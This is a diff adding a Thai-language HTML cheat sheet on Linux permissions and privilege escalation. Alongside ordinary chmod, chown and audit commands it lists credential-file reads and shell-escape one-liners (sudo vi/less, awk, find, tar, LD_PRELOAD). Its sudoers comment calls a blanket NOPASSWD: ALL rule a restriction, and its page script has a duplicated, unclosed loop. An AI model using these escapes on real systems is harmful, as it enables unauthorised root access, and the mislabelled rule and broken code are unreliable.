@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Privilege Management - PHANTOM DINICAL</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Michroma&family=Anuphan:wght@300;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <style>
+        :root {
+            --bg-color: #080808;
+            --card-bg: #111111;
+            --border-color: #1a1a1a;
+            --accent-red: #c21d1d;
+            --accent-orange: #ff9d00;
+            --accent-lavender: #e0b0ff;
+            --text-main: #ffffff;
+            --text-muted: #888888;
+        }
+
+        /* Base Styles */
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Anuphan', sans-serif;
+            padding: 20px 15px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container { 
+            max-width: 800px; 
+            width: 100%;
+        }
+
+        /* Header Navigation */
+        .header-nav {
+            margin-bottom: 30px;
+        }
+
+        .back-link { 
+            color: var(--accent-orange); 
+            text-decoration: none; 
+            font-family: 'Michroma', sans-serif; 
+            font-size: 10px; 
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+            opacity: 0.8;
+            transition: 0.3s;
+        }
+
+        .back-link:hover { opacity: 1; }
+
+        h1 {
+            font-family: 'Michroma', sans-serif;
+            color: var(--accent-red);
+            font-size: clamp(20px, 6vw, 32px);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 5px;
+        }
+
+        /* Section Cards */
+        .section {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 25px;
+            margin-bottom: 20px;
+            border-radius: 16px;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .section::before {
+            content: "";
+            position: absolute;
+            left: 0; top: 20px; bottom: 20px;
+            width: 3px;
+            background: var(--accent-orange);
+            border-radius: 0 3px 3px 0;
+        }
+
+        h2 {
+            font-family: 'Michroma', sans-serif;
+            font-size: 14px;
+            color: var(--accent-lavender);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            letter-spacing: 0.5px;
+        }
+
+        .num-label { color: var(--accent-orange); margin-right: 12px; }
+
+        .desc { 
+            font-size: 13px; 
+            color: var(--text-muted); 
+            line-height: 1.6; 
+            margin-bottom: 20px; 
+        }
+
+        /* Code Blocks */
+        pre {
+            background: #000000;
+            padding: 18px;
+            border-radius: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--accent-lavender);
+            overflow-x: auto;
+            border: 1px solid #1a1a1a;
+            line-height: 1.7;
+        }
+
+        .cmd { color: var(--accent-orange); font-weight: 500; }
+        .comment { color: #555; font-style: italic; }
+
+        /* Footer - รวมการแก้ไข Glow และการจัดวาง */
+        footer {
+            margin-top: 60px;
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .dev-brand { 
+            font-family: 'Michroma', sans-serif; 
+            font-size: 18px; 
+            letter-spacing: 4px; 
+            color: #fff; 
+            margin-bottom: 5px; 
+        }
+        
+        .linux-logos { 
+            display: flex; 
+            justify-content: center; 
+            gap: 25px; 
+            margin-bottom: 10px;
+        }
+        
+        .linux-logos img { 
+            height: 18px; 
+            width: auto;
+            transition: all 0.3s ease;
+        }
+
+        /* Glow Effects แยกตามแบรนด์ */
+        .logo-kali { filter: drop-shadow(0 0 6px #36C5F0); }
+        .logo-debian { filter: drop-shadow(0 0 6px #A81D33); }
+        .logo-ubuntu { filter: drop-shadow(0 0 6px #E95420); }
+        .logo-arch { filter: drop-shadow(0 0 6px #1793D1); }
+        
+        .security-footer {
+            font-family: 'JetBrains Mono', monospace; 
+            font-size: 10px; 
+            color: #4caf50;
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px;
+            letter-spacing: 1px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+
+        @media (max-width: 600px) {
+            pre { font-size: 11px; padding: 15px; }
+            .section { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header-nav">
+       <a href="index.html" class="back-link">< BACK_TO_CORE</a>
+        </a>
+        <h1>USER_PRIVILEGE_LAB</h1>
+    </div>
+
+    <div class="section">
+        <h2><span class="num-label">01.</span> FILE_PERMISSION_MATRIX</h2>
+        <p class="desc">พื้นฐานสิทธิ์การเข้าถึงไฟล์ในระบบ Linux (Read/Write/Execute)</p>
+        <pre>
+<span class="comment"># โครงสร้าง: [Owner][Group][Others]</span>
+<span class="cmd">chmod 755</span> - rwxr-xr-x (Default สำหรับ Folder)
+<span class="cmd">chmod 644</span> - rw-r--r-- (Default สำหรับ File)
+<span class="cmd">chmod 400</span> - r-------- (Protect Private Key)
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2><span class="num-label">02.</span> OWNERSHIP_LOGIC</h2>
+        <p class="desc">การจัดการความเป็นเจ้าของเพื่อความปลอดภัยของ Service</p>
+        <pre>
+<span class="cmd">sudo chown</span> phantom:admin config.php
+<span class="cmd">sudo chown</span> -R www-data:www-data /var/www/html
+<span class="comment"># สำหรับ Web Server</span>
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2><span class="num-label">03.</span> SUDOERS_SECURITY</h2>
+        <p class="desc">การกำหนดสิทธิ์ Root แบบละเอียด (Granular Control)</p>
+        <pre>
+<span class="comment"># อนุญาตให้ใช้เฉพาะ Service Management</span>
+phantom ALL=(ALL) /usr/bin/systemctl restart nginx
+
+<span class="comment"># จำกัดการรันคำสั่งโดยไม่ต้องใช้รหัสผ่านเฉพาะกลุ่ม admin</span>
+%admin ALL=(ALL) NOPASSWD: ALL
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2><span class="num-label">04.</span> ADVANCED_BITS</h2>
+        <p class="desc">เทคนิค SUID, SGID และ Sticky Bit สำหรับความปลอดภัยระดับสูง</p>
+        <pre>
+<span class="cmd">chmod u+s</span> /usr/bin/binary <span class="comment"># รันไฟล์ด้วยสิทธิ์เจ้าของ (SUID)</span>
+<span class="cmd">chmod +t</span> /tmp/shared      <span class="comment"># ป้องกันคนอื่นลบไฟล์ (Sticky Bit)</span>
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2><span class="num-label">05.</span> PRIVILEGE_AUDIT</h2>
+        <p class="desc">คำสั่งสำหรับตรวจสอบความผิดปกติของสิทธิ์ในระบบ</p>
+        <pre>
+<span class="cmd">sudo -l</span>             <span class="comment"># ตรวจสอบสิทธิ์ sudo ของตนเอง</span>
+<span class="cmd">find / -perm -4000</span>  <span class="comment"># ค้นหาไฟล์ SUID ที่อาจเป็นช่องโหว่</span>
+<span class="cmd">last</span>                <span class="comment"># ดูประวัติการ Login ล่าสุด</span>
+<span class="cmd">cat /etc/group</span>      <span class="comment"># ตรวจสอบสมาชิกในกลุ่มสำคัญ (เช่น wheel, sudo)</span>
+        </pre>
+    </div>
+
+    <footer>
+        <div class="dev-brand">DEV.PHANTOM</div>
+        <div class="linux-logos">
+            <img src="https://cdn.simpleicons.org/kalilinux/36C5F0" alt="Kali" class="logo-kali">
+            <img src="https://cdn.simpleicons.org/debian/A81D33" alt="Debian" class="logo-debian">
+            <img src="https://cdn.simpleicons.org/ubuntu/E95420" alt="Ubuntu" class="logo-ubuntu">
+            <img src="https://cdn.simpleicons.org/archlinux/1793D1" alt="Arch" class="logo-arch">
+        </div>
+        <div class="security-footer">
+            <i data-lucide="shield-check" style="width:12px; stroke-width: 3px;"></i> 
+            SSL_ENCRYPTED | SYSTEM_SECURE | 2026
+        </div>
+    </footer>
+</div>
+<script>
+const topics = [
+{ title:"USER_IDENTITY_CHECK", desc:"ตรวจสอบ user ปัจจุบัน", code:`whoami\nid\nlogname` },
+
+{ title:"GROUP_MEMBERSHIP", desc:"ดู group ของ user", code:`groups\nid username` },
+
+{ title:"SUDO_PRIVILEGES", desc:"ดูสิทธิ sudo", code:`sudo -l` },
+
+{ title:"PASSWD_FILE_ANALYSIS", desc:"ดู user ทั้งระบบ", code:`cat /etc/passwd` },
+
+{ title:"SHADOW_FILE_ACCESS", desc:"ตรวจสอบ shadow (root เท่านั้น)", code:`sudo cat /etc/shadow` },
+
+{ title:"LOGIN_HISTORY", desc:"ดูประวัติ login", code:`last\nlastlog` },
+
+{ title:"ACTIVE_USERS", desc:"ดู user ที่ online", code:`w\nwho` },
+
+{ title:"PROCESS_OWNER", desc:"ดู process + owner", code:`ps aux` },
+
+{ title:"KILL_PROCESS", desc:"หยุด process", code:`kill -9 PID` },
+
+{ title:"CRON_JOBS_ENUM", desc:"ตรวจสอบ cron jobs", code:`crontab -l\nls /etc/cron*` },
+
+{ title:"ENV_VARIABLES", desc:"ดู environment", code:`env\nprintenv` },
+
+{ title:"PATH_EXPLOIT_CHECK", desc:"ตรวจสอบ PATH", code:`echo $PATH` },
+
+{ title:"SUID_FILES", desc:"หา SUID", code:`find / -perm -4000 2>/dev/null` },
+
+{ title:"SGID_FILES", desc:"หา SGID", code:`find / -perm -2000 2>/dev/null` },
+
+{ title:"WORLD_WRITABLE", desc:"หาไฟล์เขียนได้ทุกคน", code:`find / -perm -2 -type f 2>/dev/null` },
+
+{ title:"WRITABLE_DIRS", desc:"หา dir เขียนได้", code:`find / -writable -type d 2>/dev/null` },
+
+{ title:"CHECK_CAPABILITIES", desc:"Linux capabilities", code:`getcap -r / 2>/dev/null` },
+
+{ title:"DOCKER_GROUP_RISK", desc:"docker = root?", code:`groups | grep docker` },
+
+{ title:"SUDOERS_FILE", desc:"ดู config sudo", code:`sudo cat /etc/sudoers` },
+
+{ title:"SUDOERS_D", desc:"ดู sudoers.d", code:`ls /etc/sudoers.d/` },
+
+{ title:"SSH_KEYS", desc:"ตรวจสอบ SSH key", code:`ls ~/.ssh\ncat ~/.ssh/authorized_keys` },
+
+{ title:"HISTORY_ENUM", desc:"ดู command history", code:`history\ncat ~/.bash_history` },
+
+{ title:"NETWORK_INFO", desc:"ดู network", code:`ip a\nnetstat -tulnp` },
+
+{ title:"OPEN_PORTS", desc:"ดู port เปิด", code:`ss -tuln` },
+
+{ title:"MOUNT_INFO", desc:"ดู mount", code:`mount\ncat /etc/fstab` },
+
+{ title:"NFS_CHECK", desc:"ตรวจสอบ NFS", code:`showmount -e` },
+
+{ title:"KERNEL_VERSION", desc:"ดู kernel", code:`uname -a` },
+
+{ title:"OS_INFO", desc:"ดู OS", code:`cat /etc/os-release` },
+
+{ title:"SUDO_VERSION", desc:"ดู sudo version", code:`sudo -V` },
+
+{ title:"PASSWORD_POLICY", desc:"policy password", code:`cat /etc/login.defs` },
+
+{ title:"LIMITS_CONF", desc:"limit user", code:`cat /etc/security/limits.conf` },
+
+{ title:"PAM_CONFIG", desc:"PAM config", code:`cat /etc/pam.d/common-auth` },
+
+{ title:"SERVICE_STATUS", desc:"service", code:`systemctl list-units --type=service` },
+
+{ title:"RUNNING_SERVICES", desc:"services running", code:`service --status-all` },
+
+{ title:"FIREWALL_STATUS", desc:"firewall", code:`ufw status\niptables -L` },
+
+{ title:"SUDO_NOPASSWD_CHECK", desc:"NOPASSWD risk", code:`sudo -l | grep NOPASSWD` },
+
+{ title:"EDITOR_EXPLOIT", desc:"sudo vi exploit", code:`sudo vi file` },
+
+{ title:"LESS_EXPLOIT", desc:"less privilege escape", code:`sudo less /etc/passwd` },
+
+{ title:"PYTHON_SHELL", desc:"spawn shell", code:`python3 -c 'import os; os.system("/bin/bash")'` },
+
+{ title:"BASH_SHELL", desc:"spawn bash", code:`/bin/bash -p` },
+
+{ title:"PERL_SHELL", desc:"perl shell", code:`perl -e 'exec "/bin/sh";'` },
+
+{ title:"FIND_ESCAPE", desc:"find exploit", code:`find . -exec /bin/sh \\;` },
+
+{ title:"AWK_ESCAPE", desc:"awk shell", code:`awk 'BEGIN {system("/bin/sh")}'` },
+
+{ title:"TAR_ESCAPE", desc:"tar exploit", code:`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` },
+
+{ title:"ENV_PATH_HIJACK", desc:"PATH hijack", code:`export PATH=.:$PATH` },
+
+{ title:"LD_PRELOAD", desc:"preload exploit", code:`export LD_PRELOAD=/tmp/exploit.so` },
+
+{ title:"TMP_PRIV_ESC", desc:"tmp writable", code:`ls -ld /tmp` },
+
+{ title:"SHELLS_AVAILABLE", desc:"available shells", code:`cat /etc/shells` }
+];
+
+const container = document.querySelector(".container");
+const startIndex = document.querySelectorAll(".section").length;
+topics.forEach((item, index) => {
+    const section = document.createElement("div");
+    section.className = "section";
+
+    topics.forEach((item, index) => {
+    const section = document.createElement("div");
+    section.className = "section";
+
+    section.innerHTML = `
+        <h2><span class="num-label">${String(startIndex + index + 1).padStart(2, '0')}.</span> ${item.title}</h2>
+        <p class="desc">${item.desc}</p>
+        <pre><code>${item.code}</code></pre>
+    `;
+
+    container.insertBefore(section, document.querySelector("footer"));
+});
+</script>
